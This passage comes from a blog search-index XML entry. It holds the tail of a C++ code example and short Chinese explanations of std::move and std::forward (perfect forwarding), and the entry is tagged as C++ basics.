obj2=<span class="hljs-built_in">getObj</span>();<br>    std::cout&lt;&lt;obj2.mPtr&lt;&lt;<span class="hljs-string">&quot; &quot;</span>&lt;&lt;*obj2.mPtr&lt;&lt;std::endl;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li></ol><h3 id="move"><a href="#move" class="headerlink" title="move"></a>move</h3><p>使用std::move方法可以将左值转换为右值。使用这个函数并不能移动任何东西，而是和移动构造函数一样都具有移动语义，将对象的状态或者所有权从一个对象转移到另一个对象，只是转移，没有内存拷贝。</p><h3 id="forward"><a href="#forward" class="headerlink" title="forward"></a>forward</h3><p>右值引用类型是独立于值的，一个右值引用作为函数参数的形参时，在函数内部转发该参数给内部其他函数时，它就变成一个左值，并不是原来的类型了。如果需要按照参数原来的类型转发到另一个函数，可以使用 C++11 提供的 std::forward () 函数，该函数实现的功能称之为完美转发。</p>]]></content>
    
    
    
    <tags>
      
      <tag>c++基础</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
